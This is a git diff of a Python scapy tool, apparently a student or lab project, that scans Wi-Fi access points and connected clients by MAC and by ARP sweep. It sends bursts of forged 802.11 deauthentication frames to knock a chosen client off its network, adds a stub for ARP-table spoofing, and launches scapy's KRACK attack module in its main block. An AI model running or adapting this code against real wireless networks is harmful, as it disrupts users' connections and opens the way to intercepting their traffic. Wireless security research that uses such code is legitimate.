@@ -3,6 +3,7 @@ import sys
 import threading
 import subprocess
 import logging
+from contextlib import redirect_stdout
 
 
 logging.basicConfig(filename=os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'log', 'sniff.log'),
@@ -15,9 +16,12 @@ from scapy.all import *  # noqa: E402
 
 iface_managed = None
 iface_monitor = None
+network_list = []
+connected_network = None
+host_list = None
 
 class Network:
-    def __init__(self, ssid: str, bssid: str, channel: int, crypto: set[str], gateway: str = None, subnet: int = None):
+    def __init__(self, ssid: str, bssid: str, channel: int, crypto: set[str], gateway: str = '192.168.0.1', subnet: int = 24):
         self.ssid = ssid
         self.bssid = bssid
         self.channel = channel
@@ -26,8 +30,8 @@ class Network:
         self.subnet = subnet
 
     def __str__(self):
-        return ('[Network info] ssid:{}  bssid:{}  channel:{}  crypto:{}  gateway:{}  subnet:{}'
-                .format(self.ssid, self.bssid, self.channel, self.crypto, self.gateway, self.subnet))
+        return ('[Network info] ssid:{}  bssid:{}  channel:{}  crypto:{}'
+                .format(self.ssid, self.bssid, self.channel, self.crypto))
 
 class Host:
     def __init__(self, bssid: str, MAC: str, IP: str):
@@ -103,17 +107,23 @@ def simple_connect_to_wifi(ssid, iface=None):
 # Send de-authentication frame to force disconnect a specific client or all clients connected to the target network
 #   [Input] Network, Target Client MAC address, Broadcast or not, Network interface to use
 #   [Output] None
-def disconnect_client(network: Network, client_MAC: str = '', broadcast: bool = False, iface=None):
+def disconnect_client(network: Network=None, client_MAC: str = '', broadcast: bool = False, iface=None):
+    if iface is None:
+        iface = iface_monitor
+    if network is None:
+        network = connected_network
     def from_hexstream_to_packet(hexstream):
         packet = RadioTap(bytes.fromhex(hexstream))
         return packet
     def send_deauth_packet(packet, iface, count, inter):
         def produce_sc(frag: int, seq: int) -> int:
             return (seq << 4) + frag
-        for seq_num in range(count):
-            packet[Dot11].SC = produce_sc(0, seq_num)
-            sendp(packet, iface=iface, monitor=True, count=1)
-            packet.addr1, packet.addr2 = packet.addr2, packet.addr1  # Swap src, dst
+        print(packet.summary())
+        with redirect_stdout(io.StringIO()):
+            for seq_num in range(count):
+                packet[Dot11].SC = produce_sc(0, seq_num)
+                sendp(packet, iface=iface, monitor=True, count=1)
+                packet.addr1, packet.addr2 = packet.addr2, packet.addr1  # Swap src, dst
 
     if iface is None:
         iface = iface_monitor
@@ -129,14 +139,18 @@ def disconnect_client(network: Network, client_MAC: str = '', broadcast: bool = 
     '''
     deauth_packet_type1 = from_hexstream_to_packet('00000c000480000002001800c0003a0104292e794a12588694a0b468588694a0b46800000700')
     deauth_packet_type2 = from_hexstream_to_packet('00000b0000800200000000c0003a0104292e794a12588694a0b468588694a0b46800000700')
-
     set_channel(network.channel, iface)
     thread1 = threading.Thread(target=send_deauth_packet, args=(deauth_packet_type1, iface, 100, 0.1))
     thread2 = threading.Thread(target=send_deauth_packet, args=(deauth_packet_type2, iface, 100, 0.1))
+    print(f'[monitor] Sending 100 802.11 Deauthentication Frame to AP and client host... ')
     thread1.start()
     thread2.start()
     thread1.join()
     thread2.join()
+    print(f'[monitor] Done. ')
+
+def spoof_ARP_table(gateway_IP: str, target_IP: str, iface: None):
+    ...
 
 
 # Change the channel of the target network interface. (Only works in monitor mode.)
@@ -198,33 +212,42 @@ def scan_AP(channels: list[int] = None, frequency: str = None, active: bool = Fa
         elif frequency.lower() == '5ghz':
             channels = wifi_5_channels
 
-    print('Start passive scan')
+    print('[monitor] Start passive scan(from beacon frame)...')
 
     for n in channels:
         # Sequential channel switching - Stays for 1 second on each channel
         current_channel = n
-        print('Current channel: %d' % n)
+        print('[monitor] Current channel: %d' % n)
         set_channel(n, iface)
         # 비콘 프레임은 보통 100ms마다 송신되기 때문에 timeout=0.1~0.2여도 충분할 것 같다.
         sniff(iface=iface, monitor=True, timeout=0.5, prn=handle_scan_AP, store=0)
+    print("[monitor] Done.")
     return network_list
 
 
 # Scan client devices connected to a specific network.
 #   [Input] Target network, Network interface to use
 #   [Output] Information list of client devices ( )
-def scan_host(network: Network, iface_man=None, iface_mon=None) -> list[Host]:
+def scan_host(network: Network=None, iface_man=None, iface_mon=None) -> list[Host]:
     if iface_man is None:
         iface = iface_managed
+    if network is None:
+        network = connected_network
     if iface_mon is None:
         iface = iface_monitor
+    print('[monitor] Scan MAC address of host devices... ')
     host_list = _scan_host_MAC(network, iface_mon)
+    print(f'[monitor] Done: {len(host_list)} hosts found.')
+
+    print('[managed] Scan IP address of host devices... ')
     host_list = _scan_host_IP(host_list, network, iface_man)
+    print(f'[managed] Done: {len([host for host in host_list if host.IP != ''])} hosts found.')
+
     return host_list
 
 
 # Scan MAC addresses of client devices
-def _scan_host_MAC(network: Network, iface=None) -> list[dict]:
+def _scan_host_MAC(network: Network, iface=None) -> list[Host]:
     if iface is None:
         iface = iface_monitor
     host_list = []
@@ -236,12 +259,12 @@ def _scan_host_MAC(network: Network, iface=None) -> list[dict]:
                         and packet.addr3 == network.bssid):
                     if packet.addr2 not in [host.MAC for host in host_list]:
                         host_list.append(Host(network.bssid, packet.addr2, ''))
-                        print(host_list[-1])
+                        # print(host_list[-1])
                 elif (packet.type == 2  # Data Frame (But)
                       and packet.addr1 == network.bssid):  # Client -> AP (To DS=1, From DS=0)
                     if packet.addr2 not in [host.MAC for host in host_list]:
                         host_list.append(Host(network.bssid, packet.addr2, ''))
-                        print(host_list[-1])
+                        # print(host_list[-1])
         except (KeyError, TypeError) as e:  # Probably a malformed packet
             ...
 
@@ -251,7 +274,7 @@ def _scan_host_MAC(network: Network, iface=None) -> list[dict]:
 
 
 # Scan IP addresses of client devices
-def _scan_host_IP(host_list: list[Host], network: Network, iface=None) -> list[dict]:
+def _scan_host_IP(host_list: list[Host], network: Network, iface=None) -> list[Host]:
     _find_MAC_from_IP(host_list, network, iface)
 
     return host_list
@@ -263,7 +286,10 @@ def _find_MAC_from_IP(host_list: list[Host], network: Network, iface=None):
         iface = iface_managed
     ARP_request = (Ether(dst='ff:ff:ff:ff:ff:ff', src=iface.mac, type='ARP')
                    / ARP(hwsrc=iface.mac, psrc=iface.ip, pdst='{}/{}'.format(network.gateway, network.subnet))[0])
-    answered_list = srp(ARP_request, iface=iface, timeout=10)[0]
+    print(f'[managed] Collect ARP responses for all IP addresses in the internal network range [{network.gateway}/{network.subnet}]... ')
+    print(ARP_request.summary())
+    with redirect_stdout(io.StringIO()):
+        answered_list = srp(ARP_request, iface=iface, timeout=10)[0]
     for sent, received in answered_list:  # ARP Response
         appended = False
         for host in host_list:
@@ -273,7 +299,7 @@ def _find_MAC_from_IP(host_list: list[Host], network: Network, iface=None):
         if not appended:
             host_list.append(Host(network.bssid, received.hwsrc, received.psrc))
 
-        print('{} - {}'.format(received.hwsrc, received.psrc))
+        print('MAC:{} - IP:{}'.format(received.hwsrc, received.psrc))
     return host_list
 
 
@@ -293,9 +319,21 @@ if __name__ == '__main__':
     if network.subnet is None:
         network.subnet = 24
     '''
-    network = Network('monodoo2.4', '58:86:94:a0:b4:68', 3, {'WPA2/PSK'}, '192.168.0.1', 24)
-
+    network = Network('monodoo2.4', '--:--:--:--:--:--', 3, {'WPA2/PSK'}, '192.168.0.1', 24)
     set_channel(network.channel)
+
+    from scapy.modules.krack import KrackAP
+    #load_module("krack")
+    KrackAP(
+        iface=iface_monitor,  # A monitor interface
+        ap_mac='11:22:33:44:55:66',  # MAC (BSSID) to use
+        ssid="TEST_KRACK",  # SSID
+        passphrase="testtest",  # Associated passphrase
+        channel=3
+    ).run()
+
     host_list = scan_host(network=network)
     client_mac = [host.MAC for host in host_list if host.IP == '192.168.0.13'][0]
     disconnect_client(network=network, client_MAC=client_mac)
+    
+
